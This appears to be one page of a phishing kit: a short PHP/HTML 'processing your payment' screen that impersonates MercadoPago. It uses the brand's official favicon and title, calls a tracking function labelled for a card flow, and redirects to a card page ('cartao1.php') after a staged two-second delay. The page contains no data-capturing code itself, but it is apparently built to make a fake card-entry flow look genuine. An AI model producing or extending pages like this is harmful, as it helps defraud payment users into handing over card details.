<?php require_once __DIR__ . '/config.php'; ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
  <title>MercadoPago - Processando...</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="stylesheet" href="css/checkout.css">
</head>
<body>

<div class="mp-overlay">
  <div class="mp-spinner"></div>
  <p class="mp-overlay__txt">Processando seu pagamento...</p>
</div>

<script src="js/sdk.min.js"></script>
<script>
  _SDK.initTracking('loading-cartao');
  setTimeout(function () {
    window.location.href = 'cartao1.php';
  }, 2000);
</script>
</body>
</html>
